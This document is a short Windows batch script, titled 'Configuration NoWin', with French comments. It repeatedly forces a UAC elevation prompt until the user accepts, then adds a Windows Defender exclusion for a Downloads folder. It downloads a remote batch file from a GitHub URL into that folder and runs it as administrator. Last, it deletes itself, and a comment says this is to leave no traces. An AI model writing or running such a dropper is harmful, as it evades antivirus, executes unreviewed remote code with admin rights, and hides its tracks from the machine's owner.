@echo off
setlocal
title Configuration NoWin

:: --- AUTO-ELEVATION ---
:check_admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    :: On tente l'élévation. On cache les erreurs si l'utilisateur refuse.
    powershell -Command "try { Start-Process '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if %errorLevel% neq 0 ( goto :check_admin )
    exit /b
)

:: --- PAYLOAD (Exécuté en Admin) ---
:: On exécute ta commande PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$p = \"$env:USERPROFILE\Downloads\NoWin\"; ^
    if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; ^
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; ^
    Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
    Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"

:: --- NETTOYAGE ---
:: Le script s'auto-supprime après exécution pour ne pas laisser de traces ou de vieille version
start /b "" cmd /c del "%~f0"&exit
